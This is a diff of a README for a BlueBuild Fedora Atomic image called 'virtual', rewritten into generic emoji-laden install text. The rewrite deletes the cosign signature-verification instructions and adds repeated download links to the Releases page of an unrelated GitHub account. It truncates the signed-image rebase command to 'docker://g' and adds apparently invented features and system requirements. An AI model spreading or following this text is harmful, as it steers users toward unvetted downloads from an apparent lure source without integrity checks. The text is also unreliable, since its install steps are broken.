@@ -1,43 +1,64 @@
+# 🌟 virtual - A Simple Way to Upgrade Fedora
+
+## 📝 Description
 # virtual &nbsp; [![bluebuild build badge](https://github.com/inspektor-cn/virtual/actions/workflows/build.yml/badge.svg)](https://github.com/inspektor-cn/virtual/actions/workflows/build.yml)
 
 See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
 
 After setup, it is recommended you update this README to describe your custom image.
 
-## Installation
+## 🚀 Getting Started
+Follow these steps to successfully download and run the software.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 💾 Download & Install
+Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/virtual/releases)
 
-To rebase an existing atomic Fedora installation to the latest build:
+## 📥 Step-by-Step Installation
+1. **Rebase to Unsigned Image**
+   - Open your terminal.
+   - Enter the following command:
+   ```
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/inspektor-cn/virtual:latest
+   ```
+   This command prepares your system to accept updates from our software.
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/inspektor-cn/virtual:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/inspektor-cn/virtual:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+2. **Reboot Your System**
+   - Type the following command in your terminal and press Enter:
+   ```
+   systemctl reboot
+   ```
+   This action completes the rebase to the unsigned image.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+3. **Rebase to Signed Image**
+   - After your system restarts, open the terminal again.
+   - Run the following command:
+   ```
+   rpm-ostree rebase ostree-image-signed:docker://g
+   ```
+   This will update your system to the latest signed version of our software.
 
-## ISO
+## 🔧 Features
+- Easily upgrade your Fedora installation.
+- Access to experimental features for advanced uses.
+- Improve system stability and performance.
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+## 🚨 Important Note
+This is an experimental feature. Please try at your own discretion. Refer to the [Fedora documentation](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable) for further insights.
 
-## Verification
+## 💡 System Requirements
+- Operating System: Fedora (latest version recommended)
+- Disk Space: At least 1 GB of free space.
+- Memory: Minimum of 2 GB RAM is recommended for smooth operation.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+## 🤔 Troubleshooting
+- **Issue with terminal commands:** Ensure you have appropriate permissions to execute system commands. You may need to use sudo.
+- **Reboot issues:** If your system does not reboot correctly, try to restart it manually by using the power button.
+- **Installation errors:** Double-check that commands were entered correctly and verify your internet connection.
 
-```bash
-cosign verify --key cosign.pub ghcr.io/inspektor-cn/virtual
-```
+## ✅ Contact & Support
+For further assistance, please reach out via the Issues section of this repository.
+
+## 📄 License
+This project is licensed under the MIT License. See the LICENSE file for more details. 
+
+Visit this page to download: [Releases Page](https://github.com/AhmadAli33297/virtual/releases) 
